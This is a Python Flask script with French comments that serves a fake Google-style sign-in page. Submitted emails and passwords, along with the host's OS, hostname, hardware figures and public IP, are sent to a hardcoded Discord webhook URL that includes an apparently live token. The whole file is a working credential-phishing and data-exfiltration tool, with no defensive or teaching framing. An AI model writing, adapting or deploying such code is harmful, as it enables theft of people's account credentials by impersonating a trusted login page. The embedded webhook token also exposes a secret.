from flask import Flask, request, render_template_string
import psutil
import platform
import requests
import json
import urllib.request
import webbrowser
import threading
import time

# Créer une application Flask
app = Flask(__name__)

# Code HTML en tant que chaîne de caractères
index_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Google Style</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet"> <!-- Police Poppins -->
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            text-align: center;
            width: 400px;
        }
        img {
            width: 120px;  /* Largeur du logo */
            margin-bottom: 30px; /* Espace entre le logo et le formulaire */
        }
        h1 {
            font-size: 48px;
            font-weight: bold;
            margin-bottom: 40px;
            color: #5f6368;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group input {
            padding: 15px;
            font-size: 18px;
            width: 300px;
            border-radius: 25px;
            border: 1px solid #dcdcdc;
            margin: 10px 0;
            outline: none;
        }
        .input-group input:focus {
            border-color: #4285f4;
        }
        button {
            padding: 15px;
            font-size: 18px;
            width: 320px;
            border-radius: 25px;
            border: none;
            background-color: #4285f4;
            color: white;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background-color: #357ae8;
        }
        .footer {
            margin-top: 40px;
            font-size: 14px;
            color: #5f6368;
        }
        img{
            width: 200px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo ajouté ici -->
        <img src="https://www.wikiberal.org/images/c/c3/Logo_Google.png" alt="Google Logo">
        
        <h1>Sign in</h1>
        <form action="/tzconnect" method="POST">
            <div class="input-group">
                <input type="email" name="email" placeholder="Email" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Sign in</button>
        </form>
        <div class="footer">
            <p>By signing in, you agree to our Terms of Service and Privacy Policy.</p>
        </div>
    </div>
</body>
</html>
"""

# Fonction pour obtenir les informations système
def get_system_info():
    system_info = {
        "os": platform.system(),
        "os_version": platform.version(),
        "architecture": platform.architecture(),
        "cpu": psutil.cpu_percent(interval=1),
        "cpu_count": psutil.cpu_count(logical=True),
        "memory_total": psutil.virtual_memory().total,
        "memory_used": psutil.virtual_memory().used,
        "memory_free": psutil.virtual_memory().free,
        "disk_total": psutil.disk_usage('/').total,
        "disk_used": psutil.disk_usage('/').used,
        "disk_free": psutil.disk_usage('/').free,
        "hostname": platform.node(),
        "processor": platform.processor(),
        "ip_public": get_public_ip()
    }
    return system_info

def get_public_ip():
    try:
        ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
        return ip
    except Exception as e:
        return "IP not available"

# Fonction pour envoyer les informations au webhook
def send_to_webhook(system_info, email, password, webhook_url):
    headers = {'Content-Type': 'application/json'}
    
    # Créer un message avec les informations système
    message = f"**System Info**\nOS: {system_info['os']} {system_info['os_version']}\n"
    message += f"CPU: {system_info['cpu']}% (Cores: {system_info['cpu_count']})\n"
    message += f"Memory: {system_info['memory_used'] / (1024 ** 3):.2f} GB / {system_info['memory_total'] / (1024 ** 3):.2f} GB\n"
    message += f"Disk: {system_info['disk_used'] / (1024 ** 3):.2f} GB / {system_info['disk_total'] / (1024 ** 3):.2f} GB\n"
    message += f"Hostname: {system_info['hostname']}\n"
    message += f"Public IP: {system_info['ip_public']}\n"
    
    # Ajouter l'email et le mot de passe à la fin du message
    message += f"\n**User Info**\nEmail: {email}\nPassword: {password}"

    payload = {
        "content": message,
        "username": "System Info Bot",
    }
    
    try:
        # Envoyer le message de texte avec les informations système et l'email/mot de passe
        response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
        if response.status_code == 200:
            print("System info and user data sent successfully!")
        else:
            print(f"Failed to send system info.")
    except Exception as e:
        print("An error occurred:", str(e))

# Route pour afficher le formulaire HTML
@app.route('/tzconnect', methods=['GET'])
def index():
    return render_template_string(index_html)  # Utilisation du HTML intégré

# Route pour traiter le formulaire
@app.route('/tzconnect', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    
    # Récupérer les informations système
    system_info = get_system_info()
    
    # Remplacer par l'URL de ton webhook Discord
    webhook_url = "https://discord.com/api/webhooks/1338462406451531797/NTL7fSBDmp-YEk1CX3U5smKHHfrp9lDSMAgglPgeYSs-DHXPiAzpjsJLA4KiG_FmTxsS"
    
    # Envoyer les données au webhook
    send_to_webhook(system_info, email, password, webhook_url)
    
    return '', 204  # Retourne un code 204 (aucune réponse nécessaire après soumission)

def open_browser():
    # Attendre que le serveur Flask soit complètement lancé avant d'ouvrir le navigateur
    time.sleep(2)  # Attendre 2 secondes avant d'ouvrir le navigateur
    webbrowser.open('http://127.0.0.1:5000/tzconnect')  # Ouverture dans le navigateur

if __name__ == '__main__':
    # Lancer le serveur dans un thread séparé pour ne pas bloquer l'exécution
    threading.Thread(target=lambda: app.run(debug=True, use_reloader=False, host='0.0.0.0')).start()
    # Ouvrir automatiquement le navigateur après un petit délai
    open_browser()
